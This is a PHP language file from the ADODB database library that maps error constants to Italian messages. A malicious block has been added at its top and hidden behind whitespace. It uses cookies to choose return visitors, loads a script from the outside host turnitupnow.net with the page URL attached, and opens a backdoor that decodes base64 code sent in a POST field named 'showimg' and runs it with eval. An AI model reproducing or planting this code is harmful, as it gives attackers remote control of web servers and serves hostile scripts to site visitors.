<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

// Italian language file contributed by Tiraboschi Massimiliano aka TiMax  
// www.maxdev.com  timax@maxdev.com
$ADODB_LANG_ARRAY = array (
            'LANG'                      => 'it',
            DB_ERROR                    => 'errore sconosciuto',
            DB_ERROR_ALREADY_EXISTS     => 'esiste gi&agrave;',
            DB_ERROR_CANNOT_CREATE      => 'non posso creare',
            DB_ERROR_CANNOT_DELETE      => 'non posso cancellare',
            DB_ERROR_CANNOT_DROP        => 'non posso eliminare',
            DB_ERROR_CONSTRAINT         => 'violazione constraint',
            DB_ERROR_DIVZERO            => 'divisione per zero',
            DB_ERROR_INVALID            => 'non valido',
            DB_ERROR_INVALID_DATE       => 'data od ora non valida',
            DB_ERROR_INVALID_NUMBER     => 'numero non valido',
            DB_ERROR_MISMATCH           => 'diversi',
            DB_ERROR_NODBSELECTED       => 'nessun database selezionato',
            DB_ERROR_NOSUCHFIELD        => 'nessun campo trovato',
            DB_ERROR_NOSUCHTABLE        => 'nessuna tabella trovata',
            DB_ERROR_NOT_CAPABLE        => 'DB backend non abilitato',
            DB_ERROR_NOT_FOUND          => 'non trovato',
            DB_ERROR_NOT_LOCKED         => 'non bloccato',
            DB_ERROR_SYNTAX             => 'errore di sintassi',
            DB_ERROR_UNSUPPORTED        => 'non supportato',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'valore inserito troppo grande per una colonna',
            DB_ERROR_INVALID_DSN        => 'DSN non valido',
            DB_ERROR_CONNECT_FAILED     => 'connessione fallita',
            0                           => 'nessun errore', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'dati inseriti insufficienti',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'estensione non trovata',
            DB_ERROR_NOSUCHDB           => 'database non trovato',
            DB_ERROR_ACCESS_VIOLATION   => 'permessi insufficienti'
);
?>